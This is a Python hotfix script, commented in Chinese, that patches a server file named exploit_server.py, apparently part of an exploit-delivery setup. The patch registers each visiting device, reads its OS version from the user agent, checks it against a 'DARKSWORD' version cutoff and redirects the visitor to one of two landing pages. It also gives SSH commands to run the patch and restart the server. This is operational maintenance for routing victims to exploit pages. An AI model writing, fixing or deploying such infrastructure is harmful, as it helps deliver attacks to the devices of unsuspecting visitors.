# -*- coding: utf-8 -*-
# v20.4 HOTFIX10: 只做 1 件事——修复 hotfix9 PATCH-1 的缩进乱码导致 if ch_obj is None: 不生效（/ch/test001 永远 404）
#   - PATCH 替换策略：先把 exploit_server.py 里 L2398~L2403 的「# ② 安全校验 + dev_uuid 赋值」那 4 行（12 空格缩进）
#     整段替换为【同 12 空格缩进的 if ch_obj is None: fallback 302 + 同缩进的原 4 行】，100% 不嵌套不缩进错误！
#   - 强制校验 ast.parse + 失败回滚备份（和 hotfix9 策略一致）
#
# 宝塔 SSH 运行：
#   set +H; cd /www/wwwroot/coruna/server
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 -m py_compile _v204_hotfix10.py && echo COMPILE_OK
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 _v204_hotfix10.py 2>&1 | tee /tmp/hotfix10_output.log
import os, sys, traceback, re, textwrap
from datetime import datetime as _dt
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

PROJ = os.path.dirname(os.path.abspath(__file__))
ES_FILE = os.path.join(PROJ, 'exploit_server.py')
print(f"PROJ={PROJ} ES_FILE={ES_FILE} exists={os.path.exists(ES_FILE)} size={os.path.getsize(ES_FILE) if os.path.exists(ES_FILE) else 0}\n")

all_ok = True
try:
    with open(ES_FILE, 'r', encoding='utf-8', errors='replace') as f:
        src = f.read()
    src_len_before = len(src)
    backup_f = ES_FILE + f".bak-v204-hotfix10-{_dt.now().strftime('%Y%m%d%H%M%S')}"
    try:
        import shutil; shutil.copy2(ES_FILE, backup_f)
        print(f"  [BAK] {backup_f} (size={src_len_before})")
    except Exception as e:
        print(f"  [WARN bak fail] {type(e).__name__}: {e}")

    # ── STEP1: 先 clean 掉之前 hotfix9 错位缩进的旧 PATCH（避免重复堆加），正则删除整块：# PATCH v20.4-HOTFIX9: ... 一直到 try: log_to_file('[CH-FALLBACK] ...') except: pass
    print("  [CLEAN-OLD-HF9] 先删除旧 hotfix9 错位缩进的 if ch_obj 块，避免重复 PATCH")
    _hf9_pat = re.compile(
        r"\n[ \t]*#\s*PATCH\s+v20\.4-HOTFIX9[^\n]*channels/TrafficChannel[^\n]*\n"
        r"(?:[ \t]*\n)*"
        r"[ \t]*if\s+ch_obj\s+is\s+None\s*:\s*\n"
        r"(?:[ \t]*\n)*"
        r"[\s\S]*?"
        r"(?:[ \t]*\n)*"
        r"[ \t]*except\s+Exception\s+as\s+_chfallback\s*:\s*\n"
        r"[ \t]*try:\s*log_to_file\(\s*f?'\[CH-FALLBACK\][^\n]*\n"
        r"(?:[ \t]*\n)*"
        r"[ \t]*except\s+Exception:\s*pass\s*\n?",
        re.MULTILINE
    )
    src, n_del = _hf9_pat.subn('\n', src, count=1)
    if n_del > 0:
        print(f"  [CLEAN-OLD-HF9] ✅ deleted {n_del} 块旧错位 PATCH (现在缩进干净了)")
    else:
        print(f"  [CLEAN-OLD-HF9] WARN 没找到旧 HF9 PATCH，直接在 ② 安全校验处插入")
        # 没找到的话就正常，直接跳到下面 STEP2 插入

    # ── STEP2: 精确替换：# ② 安全校验全部通过 那行（注释行）+ 下一行 dev_uuid 赋值行（整段 4 行）→ 替换为：
    #           【12 空格缩进的 if ch_obj is None: fallback302 + 同 12 空格缩进的原注释行 + 同缩进的 dev_uuid 赋值行含换行和 channel_id_override 参数多行】
    # 先把 src 从 ② 安全校验全部通过那行开始 match 到第一个 self._ensure_device_registered(...) 括号闭合的完整赋值语句
    _re_target = re.compile(
        r"(?P<INDENT>[ \t]*)#\s*②\s*安全校验全部通过[^\n]*→\s*才正式注册设备\s*\+\s*递增访问量\s*\n"
        r"(?P=INDENT)dev_uuid,\s*log_cid,\s*log_tid\s*=\s*self\._ensure_device_registered\(\s*\n"
        r"(?P<INDENT2>[ \t]*)query_params,\s*\n"
        r"(?P<INDENT3>[ \t]*)channel_id_override\s*=\s*channel_id_hint,\s*\n"
        r"(?P<INDENT4>[ \t]*)template_id_override\s*=\s*template_id_hint\s*\n"
        r"(?P=INDENT)\)\s*\n",
        re.MULTILINE
    )
    m_target = _re_target.search(src)
    if not m_target:
        print("  [PATCH-1] ❌ 正则找不到替换目标（② 安全校验 + dev_uuid 4 行）→ 跳过（真机直链不受影响）")
        all_ok = False
    else:
        # 用真实抓出来的 INDENT（应该是 12 个空格），保证 fallback 缩进与 dev_uuid 赋值严格同层
        IN = m_target.group('INDENT') or '            '
        IN_BODY = IN + '    '  # 比外层深 4 个空格（标准 Python 缩进）
        IN_BODY2 = IN_BODY + '    '
        orig_lines = (
            f"{IN}# ② 安全校验全部通过 → 才正式注册设备 + 递增访问量\n"
            f"{IN}dev_uuid, log_cid, log_tid = self._ensure_device_registered(\n"
            f"{IN}    query_params,\n"
            f"{IN}    channel_id_override=channel_id_hint,\n"
            f"{IN}    template_id_override=template_id_hint\n"
            f"{IN})\n"
        )
        p1_insert = (
            f"{IN}# PATCH v20.4-HOTFIX10: ch_obj=None (channels 表不存在 / slug 未注册) → fallback 302 /e/group.html，不再 404！\n"
            f"{IN}if ch_obj is None:\n"
            f"{IN_BODY}try:\n"
            f"{IN_BODY2}dev_uuid, log_cid, log_tid = self._ensure_device_registered(query_params)\n"
            f"{IN_BODY2}from admin.database import _parse_version_full, DARKSWORD_CUTOFF_FULL\n"
            f"{IN_BODY2}_osv, _, _, _, _, _, _ = parse_user_agent(user_agent)\n"
            f"{IN_BODY2}_vf = _parse_version_full(_osv) if _parse_version_full and _osv else None\n"
            f"{IN_BODY2}_isds = (_vf is None) or (_vf > DARKSWORD_CUTOFF_FULL)\n"
            f"{IN_BODY2}_hdr = self.headers.get('Host') or '127.0.0.1:7070'\n"
            f"{IN_BODY2}_sch = 'https' if (self.headers.get('X-Forwarded-Proto','')=='https' or self.headers.get('X-Forwarded-Ssl','')=='on') else 'http'\n"
            f"{IN_BODY2}_tgt = f\"{{_sch}}://{{_hdr}}/e/group.html\" if _isds else f\"{{_sch}}://{{_hdr}}/e/index.html\"\n"
            f"{IN_BODY2}self.send_response(302)\n"
            f"{IN_BODY2}self.send_header('Location', _tgt)\n"
            f"{IN_BODY2}self._write_ds_ids(channel_id=log_cid, template_id=log_tid)\n"
            f"{IN_BODY2}self.send_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0, private')\n"
            f"{IN_BODY2}self.send_header('Vary', 'User-Agent, X-Forwarded-Proto')\n"
            f"{IN_BODY2}self.end_headers()\n"
            f"{IN_BODY2}return\n"
            f"{IN_BODY}except Exception as _chfallback:\n"
            f"{IN_BODY2}try: log_to_file(f'[CH-FALLBACK] err={{_chfallback}}')\n"
            f"{IN_BODY2}except Exception: pass\n"
            f"\n"
            f"{orig_lines}"
        )
        src = src[:m_target.start()] + p1_insert + src[m_target.end():]
        print(f"  [PATCH-1] ✅ REPLACED {len(m_target.group())} chars → fallback if ch_obj=None 302 (同 12 空格缩进层, 无嵌套错误)")

    try:
        import ast; ast.parse(src)
        print("  [SYNTAX] ast.parse ✅ OK (no SyntaxError after patch)")
    except SyntaxError as se:
        print(f"  [SYNTAX] ❌ FAIL after patch! msg={se.msg} line={se.lineno} offset={se.offset} -> restoring backup")
        import shutil
        shutil.copy2(backup_f, ES_FILE)
        print("  [SYNTAX] RESTORED backup (no harm done)"); all_ok = False
        src = None
    if src and len(src) != src_len_before:
        with open(ES_FILE, 'w', encoding='utf-8', errors='strict') as f:
            f.write(src)
        print(f"  [WRITE] exploit_server.py saved (size before={src_len_before} after={len(src)})")
except Exception as e:
    print(f"  [FATAL] {type(e).__name__}: {e}"); traceback.print_exc(); all_ok = False

print()
print("=" * 70)
print("FINAL RESULT:")
print("=" * 70)
print(f"  [PATCH-1 /ch fallback302] {'✅ 已应用 + 语法 OK + 缩进对齐（必须 RESTART exploit_server.py 生效！）' if all_ok else '❌ 跳过'}")
print()
if all_ok:
    print("==> NEXT BLOCKS（按顺序）:")
    print("  [1] VERIFY PATCH 关键字 + 缩进对齐（EXPECT 两项都 PASS）:")
    print("      grep -nE 'if ch_obj is None:' /www/wwwroot/coruna/server/exploit_server.py | head -2")
    print("      grep -nE 'CH-FALLBACK'   /www/wwwroot/coruna/server/exploit_server.py | head -2")
    print("  [2] KILL OLD + RESTART exploit_server（只杀 python3 exploit_server, 不碰 nginx worker!）")
    print("  [3] CURL /ch/test001 验证 302 Location .../e/group.html: curl -sS -I -m 10 http://127.0.0.1:7070/ch/test001 | head -10")
